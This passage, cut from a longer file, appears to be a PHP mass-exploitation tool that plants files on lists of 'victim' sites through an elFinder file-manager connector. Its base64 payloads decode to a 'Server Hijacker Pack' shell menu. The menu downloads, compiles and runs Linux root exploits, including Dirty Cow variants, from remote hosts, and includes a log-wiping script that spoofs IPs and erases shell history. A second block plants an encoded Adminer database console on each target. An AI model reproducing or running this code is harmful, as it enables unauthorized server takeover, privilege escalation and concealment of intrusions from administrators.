0ZSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vb2ZmZW5zaXZlLXNlY3VyaXR5L2V4cGxvaXQtZGF0YWJhc2UvbWFzdGVyL3BsYXRmb3Jtcy9saW51eC9sb2NhbC84NDc4LnNoIC1PIGV4cGxvaXQuc2gNCmJhc2ggZXhwbG9pdC5zaA0Kcm0gZXhwbG9pdC5zaCAmJiBybSBleHBsb2l0LmMNCmNoZWNrcm9vdDsNCg0Kd2dldCAtLW5vLWNoZWNrLWNlcnRpZmljYXRlIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9vZmZlbnNpdmUtc2VjdXJpdHkvZXhwbG9pdC1kYXRhYmFzZS9tYXN0ZXIvcGxhdGZvcm1zL2xpbnV4L2xvY2FsLzEyMTMwLnB5IC1PIGV4cGxvaXQucHkNCnB5dGhvbiBleHBsb2l0LnB5DQpybSBleHBsb2l0LnB5ICYmIHJtICouYw0KY2hlY2tyb290Ow0KDQp3Z2V0IC0tbm8tY2hlY2stY2VydGlmaWNhdGUgaHR0cHM6Ly9naXRodWIuY29tL29mZmVuc2l2ZS1zZWN1cml0eS9leHBsb2l0LWRhdGFiYXNlLWJpbi1zcGxvaXRzL3Jhdy9tYXN0ZXIvc3Bsb2l0cy85NDM2LnRneg0KdGFyIC14dmYgOTQzNi50Z3oNCmJhc2ggcnVuLnNoDQpybSBydW4uc2ggJiYgcm0gcnVuLmMgJiYgcm0gZXhwbG9pdC5jICYmIHJtIDk0MzYudGd6DQpjaGVja3Jvb3Q7DQoNCndnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSBodHRwczovL2dpdGh1Yi5jb20vb2ZmZW5zaXZlLXNlY3VyaXR5L2V4cGxvaXQtZGF0YWJhc2UtYmluLXNwbG9pdHMvcmF3L21hc3Rlci9zcGxvaXRzLzk0MzUudGd6DQp0YXIgLXh2ZiA5NDM1LnRneg0KY2Qgd3VuZGVyYmFyX2VtcG9yaXVtLw0KYmFzaCB3dW5kZXJiYXJfZW1wb3JpdW0uc2gNCmNkIC4uDQpybSB3dW5kZXJiYXJfZW1wb3JpdW0gJiBybSA5NDM1LnRneg0KY2hlY2tyb290Ow0KDQp3Z2V0IGh0dHA6Ly9wYWNrZXRzdG9ybXNlY3VyaXR5LmNvbS9maWxlcy9kb3dubG9hZC8xMjY2MDMvY3ZlLTIwMTQtMDE5Ni1tZC5jIC1PIGV4cGxvaXQuYw0KZ2NjIGV4cGxvaXQuYyAtbHV0aWwgLWxwdGhyZWFkDQouL2Eub3V0DQpybSBhLm91dCAmJiBybSBleHBsb2l0LmMNCmNoZWNrcm9vdDsNCg0KZWNobw0KZWNobyAiU3JyeS4uOiggSSB0cmllZCBoYXJkLCBidXQgbm8gbHVjayB0aGlzIHRpbWUuLiBXYWl0IGZvciB1cGRhdGUiDQoNCg0KOzsNCjIpDQojQXV0byBSb290IERpcnR5IENvdyBFeHBsb2l0DQojTWFkZSBieSBZdWtpbm9zaGl0YSA0Nw0KZWNobyAiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Ig0KZWNobyAiICAgICAgICAgQXV0byBSb290IERpcnR5IENvdyBFeHBsb2l0IHYuIDEuMCINCmVjaG8gIiAgICAgICAgICAgICAgICAgICAgQ3JlYXRlZCBCeSINCmVjaG8gIiAgICAgICAgICAgICAgICAgIFl1a2lub3NoaXRhIDQ3Ig0KZWNobyAiPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Ig0KDQpjaGVja3Jvb3QoKSB7DQppZiBbICQoaWQgLXUpID09IDAgXTsgdGhlbg0KZWNobw0KZWNobyAiU3VjY2Vzc2Z1bGx5IFIwMFQoZWQpLi4gaGF2ZSBmdW4gRG9udCBGb3JnZXQgVG8gU21pbGUgOikiDQppZD0kKGlkKQ0KZWNobyAiSUQgICAgID0+ICIgJGlkDQp3aG89JCh3aG9hbWkpDQplY2hvICJXSE9BTUkgPT4gIiAkd2hvDQpleGl0DQplbHNlDQplY2hvICIiDQplY2hvICJSMDBUaW5nLi4gd2FpdCINCnNsZWVwIDENCmZpDQp9DQplY2hvICJBdXRvIFIwMFRpbmcgc3RhcnQuLi4iDQpjaGVja3Jvb3Q7DQoNCndnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vRmlyZUZhcnQvZGlydHljb3cvbWFzdGVyL2RpcnR5LmMgLU8gZXhwbG9pdC5jDQpnY2MgZXhwbG9pdC5jIC1vIGV4cGxvaXQNCi4vZXhwbG9pdA0Kcm0gZXhwbG9pdCAmJiBybSBleHBsb2l0LmMNCmNoZWNrcm9vdDsNCg0Kd2dldCAtLW5vLWNoZWNrLWNlcnRpZmljYXRlIGh0dHBzOi8vZ2lzdC5naXRodWJ1c2VyY29udGVudC5jb20vS3JFODByLzQyZjg2Mjk1NzdkYjk1NzgyZDVlNGY2MDlmNDM3YTU0L3Jhdy83MWM5MDJmNTVjMDlhYThjZWQzNTE2OTBlMWU2MjczNjNjMjMxYjQ1L2Mwdy5jIC1PIGV4cGxvaXQuYw0KZ2NjIGV4cGxvaXQuYyAtbyBleHBsb2l0DQouL2V4cGxvaXQNCnJtIGV4cGxvaXQgJiYgcm0gZXhwbG9pdC5jDQpjaGVja3Jvb3Q7DQoNCndnZXQgLS1uby1jaGVjay1jZXJ0aWZpY2F0ZSBodHRwczovL2dpc3QuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hay9jMzYxMzZjY2RiZWJmNWVjZmVmZDgwYzBmMmVkNjc0Ny9yYXcvOWMzNWIwZjE5MTFjMDQ3NmU3OTRjMjRkZGRkYzY3NjUzZGJmZGJhMi9uYXVnaHR5YzB3LmMgLU8gZXhwbG9pdC5jDQpnY2MgZXhwbG9pdC5jIC1vIGV4cGxvaXQNCi4vZXhwbG9pdA0Kcm0gZXhwbG9pdCAmJiBybSBleHBsb2l0LmMNCmNoZWNrcm9vdDsNCg0Kd2dldCAtLW5vLWNoZWNrLWNlcnRpZmljYXRlIGh0dHBzOi8vZ2lzdC5naXRodWJ1c2VyY29udGVudC5jb20vcnZlcnRvbi9lOWQ0ZmY2NWQ3MDNhOTA4NGU4NWZhOWRmMDgzYzY3OS9yYXcvOWIxYjUwNTNlNzJhNThiNDBiMjhkNjc5OWNmNzk3OWM1MzQ4MDcxNS9jb3dyb290LmMgLU8gZXhwbG9pdC5jDQpnY2MgZXhwbG9pdC5jIC1vIGV4cGxvaXQNCi4vZXhwbG9pdA0Kcm0gZXhwbG9pdCAmJiBybSBleHBsb2l0LmMNCmNoZWNrcm9vdDsNCg0KZWNobw0KZWNobyAiU29ycnkuLjooIE5vdCBWdWxuZXJhYmxlIE1heWJlIFRoaXMgU2VydmVyIEhhcyBCZWVuIFBhdGNoZWQgOigiDQo7Ow0KMykNCiMhL2Jpbi9iYXNoDQojDQojIEd1cnUtQW50aWxvZyBWIDAuMQ0KIw0KIyB1c2FnZSA6IHRvIEV4Y2hhbmdpbmcgeW91ciBJUCB3aXRoIGZha2UgSVAgeTAgY2hvb3NlIGl0DQojDQojIGFuZCB0byBjbGVhciB5b3VyIGxhc3QgY29tbWFuZCdzIGFuZCBjbGVhciBsb2dvdXQgaGlzdG9yeSAgDQojDQojIFJlbWVtYmVyIHRoYXQuLi4NCiMNCiMgeTAgaGF2ZSBvbmUgbWludXRlIHRvIGxvZ291dCBmcm9tIGIweCBubyBtb3JlLi4gc28gYmUgY2FyZWZ1bGwNCiMgDQojIEZ1Y2sgdGhlIHdoaXRlaGF0cyANCiMgDQpjbGVhcg0KZWNobyAiLSAgIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iDQplY2hvICIgR3VydS1BbnRpbG9nIGMwZGVkICBCeSBbIHNBRkE3X2VMTmVUIF0iIA0KZWNobyAiIChTZWN1cml0eUd1cnVzLk5lVCkgLSBTZWN1cml0eUd1cnVzW0FUXWlyYy5kYWwubmV0OjY2NjcgIg0KZWNobyAiIEdyZWV0eiBnMGVzIHRvIDogQWNpZC1XYXJaLHJPQ2stTWFTdEVyLCBZdWtpbm9zaGl0YSA0NyINCmVjaG8gIiAgICAgICAgICAgICAgICAgIGo3YSxNZWRvWmVybyxTcGlkZXJ6LGFuZCBhbGwgU2VjdXJpdHlHdXJ1cy5OZVQgUFBMIiANCmVjaG8gIiAgICAgICAgICAgICAgICAgIGFuZCBhbGwgMS0tNS5jb20gZm9sa3MgIg0KZWNobyAiLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0iDQppZiBbICIkVUlEIiA9ICIwIiBdO3RoZW4NCmVjaG8gIiBoM3JlIHczIGcwICINCmVsc2UNCmVjaG8gIiBgd2hvYW1pYCB5MCBtdXN0IGJlIGxvZ2luIGJ5IHJvb3QiDQpmaQ0KZWNobyAtbiAiIFdoYXQncyB0aGUgaXAgeTAgd2FudCB0byBzcG9vZiBpdCA/ICAiDQpyZWFkIHdvcmQNCndvcmQ9JHdvcmQNCmVjaG8gLW4gIiBXaGF0J3MgdGhlIEZha2UgaXAgeTAgd2FudCAgdXNpbmcgaXQgPyAiDQpyZWFkIGZha2UNCmZha2U9JGZha2UNCnIweD0ieWVzIg0KaWYgWyAhIC1mIC92YXIvbG9nL2xhc3Rsb2cgXTsgdGhlbg0KcjB4PSJubyINCmVjaG8gIiBpIGNhbid0IGZpbmQgbGFzdGxvZyINCmZpDQppZiBbICIkcjB4IiA9ICJ5ZXMiIF07IHRoZW4NCmVjaG8gIiBFZGl0aW5nIGxhc3Rsb2ciDQpzZWQgInMvJHdvcmQvJGZha2UvZyIgL3Zhci9sb2cvbGFzdGxvZyA+IC92YXIvbG9nL2xhc3Rsb2cubmV3DQptdiAvdmFyL2xvZy9sYXN0bG9nLm5ldyAvdmFyL2xvZy9sYXN0bG9nDQpmaQ0Kc3lzbG9nPSJ5ZXMiDQppZiBbICEgLWYgL3Zhci9sb2cvc3lzbG9nIF07IHRoZW4NCmVjaG8gIiBpIGNhbid0IGZpbmQgc3lzbG9nIg0KIHN5c2xvZz0ibm8iDQpmaQ0KaWYgWyAiJHN5c2xvZyIgPSAieWVzIiBdOyB0aGVuDQplY2hvICIgRWRpdGluZyBzeXNsb2ciDQpzZWQgInMvJHdvcmQvJGZha2UvZyIgL3Zhci9sb2cvc3lzbG9nID4gL3Zhci9sb2cvc3lzbG9nLm5ldw0KbXYgL3Zhci9sb2cvc3lzbG9nLm5ldyAvdmFyL2xvZy9zeXNsb2cNCmZpDQptZXNzPSJ5ZXMiDQppZiBbICEgLWYgL3Zhci9sb2cvbWVzc2FnZXMgXTsgdGhlbg0KIGVjaG8gIiBpIGNhbid0IGZpbmQgbWVzc2FnZSAiDQptZXNzPSJubyINCmZpDQppZiBbICIkbWVzcyIgPSAieWVzIiBdOyB0aGVuDQplY2hvICIgRWRpdGluZyBtZXNzYWdlIg0Kc2VkICJzLyR3b3JkLyRmYWtlL2ciIC92YXIvbG9nL21lc3NhZ2VzID4gL3Zhci9sb2cvbWVzc2FnZXMubmV3DQptdiAvdmFyL2xvZy9tZXNzYWdlcy5uZXcgL3Zhci9sb2cvbWVzc2FnZXMNCmZpDQpodHRwPSJ5ZXMiDQppZiBbICEgLWYgL3Zhci9sb2cvaHR0cGQvYWNjZXNzX2xvZyBdOyB0aGVuDQogZWNobyAiIGkgY2FuJ3QgZmluZCBhY2Nlc3NfbG9nICINCmh0dHA9Im5vIg0KZmkNCmlmIFsgIiRodHRwIiA9ICJ5ZXMiIF07IHRoZW4NCiBlY2hvICIgRWRpdGluZyBhY2Nlc3NfbG9nIg0Kc2VkICJzLyR3b3JkLyRmYWtlL2ciIC92YXIvbG9nL2h0dHBkL2FjY2Vzc19sb2cgPiAvdmFyL2xvZy9odHRwZC9hY2Nlc3NfbG9nLm5ldw0KbXYgL3Zhci9sb2cvaHR0cGQvYWNjZXNzX2xvZy5uZXcgL3Zhci9sb2cvaHR0cGQvYWNjZXNzX2xvZw0KZmkNCmh0dHBkPSJ5ZXMiDQppZiBbICEgLWYgL3Zhci9sb2cvaHR0cGQvZXJyb3JfbG9nIF07IHRoZW4NCiBlY2hvICIgaSBjYW4ndCBmaW5kIGVycm9yX2xvZyAiDQpodHRwZD0ibm8iDQpmaQ0KaWYgWyAiJGh0dHBkIiA9ICJ5ZXMiIF07IHRoZW4NCmVjaG8gIiBFZGl0aW5nIGVycm9yX2xvZyAiDQpzZWQgInMvJHdvcmQvJGZha2UvZyIgL3Zhci9sb2cvaHR0cGQvZXJyb3JfbG9nID4gL3Zhci9sb2cvaHR0cGQvZXJyb3JfbG9nLm5ldw0KbXYgL3Zhci9sb2cvaHR0cGQvZXJyb3JfbG9nLm5ldyAvdmFyL2xvZy9odHRwZC9lcnJvcl9sb2cNCmZpDQp3dG1wPSJ5ZXMiDQppZiBbICEgLWYgL3Zhci9sb2cvd3RtcCBdOyB0aGVuDQogZWNobyAiIGkgY2FuJ3QgZmluZCB3dG1wICINCnd0bXA9Im5vIg0KZmkNCmlmIFsgIiR3dG1wIiA9ICJ5ZXMiIF07IHRoZW4NCmVjaG8gIiBFZGl0aW5nIHd0bXAgIg0Kc2VkICJzLyR3b3JkLyRmYWtlL2ciIC92YXIvbG9nL3d0bXAgPiAvdmFyL2xvZy93dG1wLm5ldw0KbXYgL3Zhci9sb2cvd3RtcC5uZXcgL3Zhci9sb2cvd3RtcA0KZmkNCnNlY3VyZT0ieWVzIg0KaWYgWyAhIC1mIC92YXIvbG9nL3NlY3VyZSBdOyB0aGVuDQplY2hvICIgaSBjYW4ndCBmaW5kIHNlY3VyZSAiDQpzZWN1cmU9Im5vIg0KZmkNCmlmIFsgIiRzZWN1cmUiID0gInllcyIgXTsgdGhlbg0KZWNobyAiIEVkaXRpbmcgc2VjdXJlICINCnNlZCAicy8kd29yZC8kZmFrZS9nIiAvdmFyL2xvZy9zZWN1cmUgPiAvdmFyL2xvZy9zZWN1cmUubmV3DQptdiAvdmFyL2xvZy9zZWN1cmUubmV3IC92YXIvbG9nL3NlY3VyZQ0KZmkNCnhmZXJsb2c9InllcyINCmlmIFsgISAtZiAvdmFyL2xvZy94ZmVybG9nIF07IHRoZW4NCmVjaG8gIiBpIGNhbid0IGZpbmQgeGZlcmxvZyAiDQp4ZmVybG9nPSJubyINCmZpDQppZiBbICIkeGZlcmxvZyIgPSAieWVzIiBdOyB0aGVuDQplY2hvICIgRWRpdGluZyB4ZmVybG9nICINCnNlZCAicy8kd29yZC8kZmFrZS9nIiAvdmFyL2xvZy94ZmVybG9nID4gL3Zhci9sb2cveGZlcmxvZy5uZXcNCm12IC92YXIvbG9nL3hmZXJsb2cubmV3IC92YXIvbG9nL3hmZXJsb2cNCmZpDQp1dG1wPSJ5ZXMiDQppZiBbICEgLWYgL3Zhci9ydW4vdXRtcCBdOyB0aGVuDQplY2hvICIgaSBjYW4ndCBmaW5kIHV0bXAgIg0KdXRtcD0ibm8iDQpmaQ0KaWYgWyAiJHV0bXAiID0gInllcyIgXTsgdGhlbg0KZWNobyAiIEVkaXRpbmcgdXRtcCAiDQpzZWQgInMvJHdvcmQvJGZha2UvZyIgL3Zhci9ydW4vdXRtcCA+IC92YXIvcnVuL3V0bXAubmV3DQptdiAvdmFyL3J1bi91dG1wLm5ldyAvdmFyL3J1bi91dG1wDQpmaQ0KZWNobyAtbiAiIGlmIHkwIHdhbnQgdG8gZGVsZXRlIHRoZSBsYXN0IGNvbW1hbmRzICB0eXBlICh5ZXMpIGlmIHkwIGRvbid0IHR5cGUgKG5vKSAwciBhbnl0aGluZyAgICAiDQpyZWFkIGNvbW1hbmQNCmlmIFsgIiRjb21tYW5kIiA9ICJ5ZXMiIF07IHRoZW4NCmVjaG8gIiMjTm93IHRoZSBsYXN0IGNvbW1hbmRzIHkwIHB1dCBpdCB3aWxsIGdvIHRvIGhlbGwgXl9eICMjIg0KZWNobyAtbiA+IH4vLmJhc2hfaGlzdG9yeQ0KaGlzdG9yeSAtYw0KZWNobyAtbiAiIHkwIGhhdmUgb25lIG1pbnV0ZSB0byBleGl0IGZyb20gc2VydmVyLi5nbzBkIGx1Y2sgIg0KL2V0Yy9pbml0LmQvYXRkIHN0YXJ0DQplY2hvICJzZWQgJ3MvJHdvcmQvJGZha2UvZycgL3Zhci9ydW4vdXRtcCA+IC92YXIvcnVuL3V0bXAubmV3IiB8IGF0IG5vdyArIDEgbWludXRlDQplY2hvICJtdiAvdmFyL3J1bi91dG1wLm5ldyAvdmFyL3J1bi91dG1wIiB8IGF0IG5vdyArIDIgbWludXRlDQplY2hvICIgR3VydS1BbnRpbG9nIEVuZGVkICB3b3JrLi4uIENoZWVycyAhICINCmV4aXQgMA0KZWxzZQ0KZWNobyAtbiAiIHkwIGhhdmUgb25lIG1pbnV0ZSB0byBleGl0IGZyb20gc2VydmVyLi5nbzBkIGx1Y2sgIg0KL2V0Yy9pbml0LmQvYXRkIHN0YXJ0DQplY2hvICJzZWQgJ3MvJHdvcmQvJGZha2UvZycgL3Zhci9ydW4vdXRtcCA+IC92YXIvcnVuL3V0bXAubmV3IiB8IGF0IG5vdyArIDEgbWludXRlDQplY2hvICJtdiAvdmFyL3J1bi91dG1wLm5ldyAvdmFyL3J1bi91dG1wIiB8IGF0IG5vdyArIDIgbWludXRlDQplY2hvICIgR3VydS1BbnRpbG9nIEVuZGVkICB3b3JrLi4uIENoZWVycyAhICINCmV4aXQgMA0KZmkNCg0KDQo7Ow0KNCkNCiMgTmFtZTogWmhlbmcgSGFvIFRhbg0KIyBFbWFpbDogdGFuemhhb0B1bWljaC5lZHUNCiMgRGF0ZTogSnVuZSAyNiwgMjAxNA0KIyBUaGlzIHNoZWxsIHNjcmlwdCB3aWxsIGNsZWFuIHVwIHRoZSBsb2cgZmlsZXMgaW4geW91ciBzeXN0ZW0uDQojIS9iaW4vYmFzaA0KIyBjaG1vZCB1K3J4IDxzY3JpcHQgbmFtZT4NCkxPR19ESVI9L3Zhci9sb2cNCmNkICRMT0dfRElSDQojIFBlcmZvcm0gY2xlYW4gdXAuDQpjYXQgL2Rldi9udWxsID4gbWVzc2FnZXMNCmNhdCAvZGV2L251bGwgPiB3dG1wDQplY2hvICJUaGUgbG9ncyBoYXZlIGJlZW4gY2xlYW5lZCB1cCEiDQojIEVPRi4NCg0KOzsNCjUpDQogICAgICAgZXhpdCAwDQo7Ow0KKikNCiAgICAgICBlY2hvICJTb3JyeSwgTm90IEF2YWlsYWJsZSINCiAgICAgICBleGl0IDENCjs7DQplc2FjDQplY2hvIC1uICJCYWNrIFRvIE1haW4gTWVudSh5L24pIDoiOw0KcmVhZCBsYWdpOw0KZG9uZQ0K";
		$decode_isi = base64_decode($isi_nama_doang);
		$encode = base64_encode($global);
		$ss = fopen($global,"w");
		fputs($ss, $decode_isi);
		echo "[+] <a href='$korban' target='_blank'>$korban</a> <br>";
		echo "Done Server Hijacker Pack berhasil di tanam coba cek, backconnect dan akses file hijack.sh nya<br>";
		$url_mkfile = "$korban?cmd=mkfile&name=$global&target=l1_Lw";
 		$post1 = array(
				"target" => "l1_$encode",
				"content" => "$decode_isi",);
 		$post2 = array( "upload[]" => "@$global",);
 		$output_mkfile = ngirim("$korban", $post1);
			$upload_ah = ngirim("$korban?cmd=upload", $post2);
			}
		}
?>
<form method="post">
<input type="submit" name="a" value="PLANT Adminer">
</form>
<?php
$target = explode("\r\n", $_POST['target']);
if($_POST['a']) {
	foreach($target as $korban) {
		$global = "adminer.php";
		$isi_nama_doang = "PD9waHANCi8qKiBBZG1pbmVyIC0gQ29tcGFjdCBkYXRhYmFzZSBtYW5hZ2VtZW50DQoqIEBsaW5rIGh0dHBzOi8vd3d3LmFkbWluZXIub3JnLw0KKiBAYXV0aG9yIEpha3ViIFZyYW5hLCBodHRwOi8vd3d3LnZyYW5hLmN6Lw0KKiBAY29weXJpZ2h0IDIwMDcgSmFrdWIgVnJhbmENCiogQGxpY2Vuc2UgaHR0cDovL3d3dy5hcGFjaGUub3JnL2xpY2Vuc2VzL0xJQ0VOU0UtMi4wIEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uIDIuMA0KKiBAbGljZW5zZSBodHRwOi8vd3d3LmdudS5vcmcvbGljZW5zZXMvZ3BsLTIuMC5odG1sIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlLCB2ZXJzaW9uIDIgKG9uZSBvciBvdGhlcikNCiogQHZlcnNpb24gNC4yLjUNCiovZXJyb3JfcmVwb3J0aW5nKDYxMzUpOyRIYz0hcHJlZ19tYXRjaCgnfl4odW5zYWZlX3Jhdyk/JH4nLGluaV9nZXQoImZpbHRlci5kZWZhdWx0IikpO2lmKCRIY3x8aW5pX2dldCgiZmlsdGVyLmRlZmF1bHRfZmxhZ3MiKSl7Zm9yZWFjaChhcnJheSgnX0dFVCcsJ19QT1NUJywnX0NPT0tJRScsJ19TRVJWRVInKWFzJFgpeyREaD1maWx0ZXJfaW5wdXRfYXJyYXkoY29uc3RhbnQoIklOUFVUJFgiKSxGSUxURVJfVU5TQUZFX1JBVyk7aWYoJERoKSQkWD0kRGg7fX1pZihmdW5jdGlvbl9leGlzdHMoIm1iX2ludGVybmFsX2VuY29kaW5nIikpbWJfaW50ZXJuYWxfZW5jb2RpbmcoIjhiaXQiKTtpZihpc3NldCgkX0dFVFsiZmlsZSJdKSl7aWYoJF9TRVJWRVJbIkhUVFBfSUZfTU9ESUZJRURfU0lOQ0UiXSl7aGVhZGVyKCJIVFRQLzEuMSAzMDQgTm90IE1vZGlmaWVkIik7ZXhpdDt9aGVhZGVyKCJFeHBpcmVzOiAiLmdtZGF0ZSgiRCwgZCBNIFkgSDppOnMiLHRpbWUoKSszNjUqMjQqNjAqNjApLiIgR01UIik7aGVhZGVyKCJMYXN0LU1vZGlmaWVk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